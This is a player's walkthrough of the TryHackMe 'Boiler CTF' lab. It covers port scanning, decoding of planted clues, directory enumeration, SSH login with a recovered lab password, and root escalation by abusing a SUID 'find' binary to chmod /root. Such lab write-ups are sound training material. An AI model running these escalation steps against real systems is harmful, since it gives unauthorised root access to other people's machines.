# Tryhackme (boiler CTF)

	enumuration process
## Nmap
```
sudo nmap -sC -sV 10.10.231.142
```
we got the ports like

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-26 16:41 IST
Nmap scan report for 10.10.231.142
Host is up (0.55s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.2.124.113
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.36 seconds


```

in this scan there is a ftp server, from that server we got an file `.info.txt` in this file there is some bunch of text are there for that we need to check any vuln.

in this file we have some of the ROT13 codes 
```
	Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

```
after decrypt: 	`Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`	



also there http server mainly `robots.txt` in thsi directory
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```
in this some of the decimal encryption. we decrypt that codes we got

OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK == base64
99b0660cd95adea327c54182baa51584  = md5
:kidding

also searched for directory list we got

`dirsearch -u http://10.10.253.152`
```
[17:22:52] 200 -   11KB - /index.html
[17:22:55] 301 -  315B  - /joomla  ->  http://10.10.231.142/joomla/
[17:22:55] 301 -  329B  - /joomla/administrator  ->  http://10.10.231.142/joomla/administrator/
[17:22:56] 200 -   12KB - /joomla/
[17:23:02] 301 -  315B  - /manual  ->  http://10.10.231.142/manual/
[17:23:02] 200 -  626B  - /manual/index.html
[17:23:24] 200 -  257B  - /robots.txt
[17:23:26] 403 -  302B  - /server-status/
[17:23:26] 403 -  301B  - /server-status


```

in site `	`
VjJodmNITnBaU0JrWVdsemVRbz0K
V2hvcHNpZSBkYWlzeQo=
Whopsie daisy


## ssh

user = basterd
passwd  superduperp@$$

```
ssh basterd@10.10.129.170 -p 55007
```
after we enter the new user id 
cat backup.sh
[image]
we got user text

cat .secret
- ` `


then check the root privilage
`sudo -l`

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it.

Use the following command to find files whose SUID bit is set.
```
    $ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```
[image]

Let’s breakdown the command we used for better understanding:

find →Search for files in a directory hierarchy.

    / →Search for files recursively from the root folder and so on.
    -perm →To set specific permission setting. In this case which is /4000 the numerical representation of the SUID bit enabled
    -type →It specify what type of files we wants to search. f for files, d for directories
    -exec →let us execute a command with the findings from find in an array. In this case I used ls -ld to show the owner of the found files and the date of creation
    2>/dev/null → which redirects all (errors) to /dev/null and keeping the output clean.

Have you observed the output we got from this command yet? In the list there is find commnad which have SUID bit set which means we can run find as root user. Using -exec flag as shown above. Let’s try out by changing the permission of root directory.
```
$ find . -exec chmod 777 /root \;
```

finally we got a root.txt

- 
